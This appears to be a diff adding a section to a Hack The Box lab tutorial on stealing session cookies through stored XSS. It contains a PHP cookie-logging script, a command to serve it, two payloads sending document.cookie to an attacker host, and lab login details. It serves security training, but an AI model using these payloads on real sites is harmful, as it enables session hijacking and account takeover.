@@ -101,3 +101,78 @@ In this module, we'll be using some basic XSS Payloads to trigger functionalitie
 ```
 
 Check these payloads by entering into the field directly, and if they get triggered, check within the Developer Tools, that if HTTPOnly if "off" or not.
+
+## Obtaining session cookies through XSS
+
+We identified that we could create and share publicly accessible profiles that contain our specified XSS payloads.
+
+Let us create a cookie-logging script (save it as `log.php`) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).
+
+Code: php
+
+```php
+<?php
+$logFile = "cookieLog.txt";
+$cookie = $_REQUEST["c"];
+
+$handle = fopen($logFile, "a");
+fwrite($handle, $cookie . "\n\n");
+fclose($handle);
+
+header("Location: http://www.google.com/");
+exit;
+?>
+```
+
+This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.
+
+The cookie-logging script can be run as follows. `TUN Adapter IP` is the `tun` interface's IP of either Pwnbox or your own VM.
+
+  Cross-Site Scripting (XSS)
+
+```shell-session
+ShibuShivansh@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
+[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
+```
+
+Before we simulate the attack, let us restore Ela Stienen's original Email and Telephone (since we found no XSS in these fields and also want the profile to look legitimate). Now, let us place the below payload in the _Country_ field. There are no specific requirements for the payload; we just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.
+
+Payload:
+
+Code: javascript
+
+```javascript
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
+```
+
+**Note**: If you're doing testing in the real world, try using something like [XSSHunter (now deprecated)](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.
+
+A sample HTTPS>HTTPS payload example can be found below:
+
+Code: javascript
+
+```javascript
+<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+
+**Simulate the victim**
+
+Open a `New Private Window`, navigate to `http://xss.htb.net` and log in to the application using the credentials below:
+
+- Email: smallfrog576
+- Password: guitars
+
+This account will play the role of the victim!
+
+Now, navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com`. This is the attacker-crafted public profile that hosts our cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified).
+
+You should now see the below in your attacking machine.
+
+![Terminal output showing PHP server started on 10.10.14.36:8000, with a GET request to /log.php containing an auth-session parameter.](https://academy.hackthebox.com/storage/modules/153/52.png)
+
+Terminate the PHP server with Ctrl+c, and the victim's cookie will reside inside `cookieLog.txt`
+
+![Terminal output showing contents of cookieLog.txt with an auth-session value.](https://academy.hackthebox.com/storage/modules/153/53.png)
+
+You can now use this stolen cookie to hijack the victim's session!
+
